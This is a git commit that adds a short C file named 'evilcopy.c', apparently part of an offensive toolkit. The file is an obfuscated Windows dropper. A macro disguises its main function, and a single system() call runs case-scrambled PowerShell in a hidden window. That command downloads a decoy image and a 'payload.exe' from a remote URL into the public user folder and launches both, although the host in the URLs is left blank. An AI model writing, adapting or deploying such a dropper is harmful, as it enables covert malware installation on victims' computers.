8f4b2d64b37cca4a14c1c82f153680bc3024aeb6
unknone hart <86870658+kishwordulal1234@users.noreply.github.com>
2023-01-10 19:08:20 +0545

    Add files via upload

---
+++ mahadev/bin/evilcopy.c
@@ -0,0 +1,19 @@
+/*
+Author: Ferdi S Kennedy [ kennedy69 ]
+Credits: null byte [ Method POC ]
+*/
+
+#include<stdio.h>
+#include<stdlib.h>
+#include<winsock2.h>
+#include<windows.h>
+
+#define _____(i,s,o,g,r,a,m)(i##r##s##o)
+#define _ _____(m,i,n,u,a,l,s)
+
+int _()
+{
+ system("PoWeRsHeLl -wIN 1 -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http:///shiva.jpg', 'C:\\Users\\Public\\shiva.jpg') & sTaRt C:\\Users\\Public\\shiva.jpg & pOwErShElL -wIN 1 -C (NeW-oBjEcT nEt.WeBClIeNt).dOwNlOaDfIlE('http:///payload.exe', 'C:\\Users\\Public\\payload.exe') & StArT C:\\Users\\Public\\payload.exe");
+  return 0;
+}
+
